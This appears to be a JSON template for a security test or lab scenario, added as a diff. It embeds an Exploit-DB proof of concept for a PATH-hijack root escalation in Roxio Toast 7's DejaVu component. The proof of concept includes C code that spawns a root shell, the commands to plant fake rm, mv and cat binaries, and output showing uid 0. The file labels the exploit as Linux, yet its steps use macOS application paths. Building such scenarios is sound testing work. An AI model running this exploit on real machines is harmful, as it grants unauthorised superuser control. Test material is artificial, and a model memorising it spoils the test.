@@ -1,0 +1,30 @@
+{
+  "template_id": "auto_edb_28405",
+  "category": "B2_path_hijack",
+  "attack_technique": "T1574.007",
+  "cwe": "CWE-426",
+  "description": "Linux privilege escalation: Roxio Toast 7 - DejaVu Component PATH Variable Privilege Escalation\n\nExploit source code (28405.txt):\n```\nsource: https://www.securityfocus.com/bid/19596/info\n\nRoxio Toast is prone to a local privilege-escalation vulnerability because it fails to properly sanitize user-supplied input. As a result, local users may set their own search path for external applications that are called by setuid programs that are included in Roxio Toast.\n\nThis issue allows local attackers to gain superuser privileges, resulting in a complete compromise of affected computers.\n\nThis issue affects the DejaVu component that is installed by default in a standard installation of the vulnerable application. DejaVu is a third-party component that is maintained by Propaganda Productions. Roxio Toast version 7 Titanium includes the vulnerable component; other versions may also be affected.\n\n1-Exploitation is trivial. A user must first create small program such\nas the one demonstrated by simple.c below.\n\nnetragard-test-1$ cat > simple.c\n\nmain()\n{\n    seteuid(0);\n    setuid(0);\n    setegid(0);\n    setgid(0);\n    system(\"/bin/sh -i\");\n}\n\n2-Once the user has created the program, the user must comple the\nprogram, copy the program to replace rm, mv and cat, and insert it\ninto the $PATH variable.\n\nnetragard-test-1$cc -o chmod simple.c\nnetragard-test-1$cp chmod /tmp/rm\nnetragard-test-1$cp chmod /tmp/mv\nnetragard-test-1$cp chmod /tmp/cat\nnetragard-test-1$export PATH=/tmp/:$PATH\n\n3-Once the user has finished with step 2, the user must then launch\nthe \"System Preferences\" control pannel.\n\nnetragard-test-1$/Applications/System\\\nPreferences.app/Contents/MacOS/System\\ Preferences\n\n4-After the user has launched the Systems Preferences helper\napplication, a GUI window should display. From that window click on\n\"Deja Vu\" located in the \"other\" section. From there create a manual\nbackup and then click the backup button. At that point you should be\npresented with a root shell prompt:\n\nsh: no job control in this shell\nsh-2.05b# id\n\nuid=0(root) gid=0(wheel) groups=0(wheel), 81(appserveradm),\n79(appserverusr), 80(admin)\n```",
+  "cve": "",
+  "exploitdb_id": "28405",
+  "feasibility": "L1",
+  "docker_run_args": [],
+  "detection_difficulty": "medium",
+  "interaction_mode": "multi_step",
+  "params": {
+    "username": {
+      "type": "string",
+      "default": "lowpriv"
+    },
+    "password": {
+      "type": "string",
+      "default": "password123"
+    }
+  },
+  "instances": [
+    {
+      "scenario_id": "edb_28405",
+      "type": "core",
+      "difficulty": "medium"
+    }
+  ]
+}
